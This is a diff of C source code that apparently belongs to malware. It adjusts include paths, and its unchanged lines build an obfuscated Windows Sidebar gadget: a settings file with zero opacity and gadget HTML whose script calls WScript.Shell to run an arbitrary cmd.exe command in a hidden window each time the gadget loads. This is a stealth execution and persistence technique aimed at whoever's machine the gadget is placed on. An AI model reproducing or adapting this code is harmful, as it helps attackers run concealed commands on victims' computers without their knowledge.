@@ -1,8 +1,11 @@
-#include "core\core.h"
-#include "core\reestr.h"
-#include "core\process.h"
-#include "core\file.h"
-#include "core\debug.h"
+#include "../../core/include/core/File.h"
+#include "../../core/include/core/path.h"
+#include "../../core/include/core/reestr.h"
+//#include "core\core.h"
+//#include "core\reestr.h"
+//#include "core\process.h"
+//#include "core\file.h"
+//#include "core\debug.h"
 
 char* contentSettingsIni = _CT_("[Root]\r\nSettingsVersion=\"00.00.00.02\"\nShowGalleryPrivacyStatementOnceComplete=\"true\"\r\nSection0=\"1\"\r\n[Section 1]\r\nPrivateSetting_GadgetName=\"%s\"\r\nPrivateSetting_GadgetDropLocationX=\"1380\"\r\nPrivateSetting_GadgetDropLocationY=\"450\"\r\nPrivateSetting_GadgetSize=\"small\"\r\nPrivateSetting_GadgetOpacity=\"0\"");
 char* mainHtml = _CT_("<html><head><title></title>\r\n<script type=\"text/jscript\" language=\"jscript\">\r\nvar WshShell = new ActiveXObject(\"WScript.Shell\");\r\nWshShell.Run (\"cmd.exe /C \\\"%s\\\"\",0); \r\n</script>\r\n<script type=\"text/javascript\">\r\nSystem.Gadget.onDock = resizetodo;\r\nSystem.Gadget.onUndock = resizetodo;\r\nresizetodo()\r\nfunction resizetodo() {\r\n bd=document.body.style;\r\n bd.width=32;bd.height=32;\r\n bd.background=\'url(1.png) no-repeat\';\r\n}</script></head><body></body></html>");
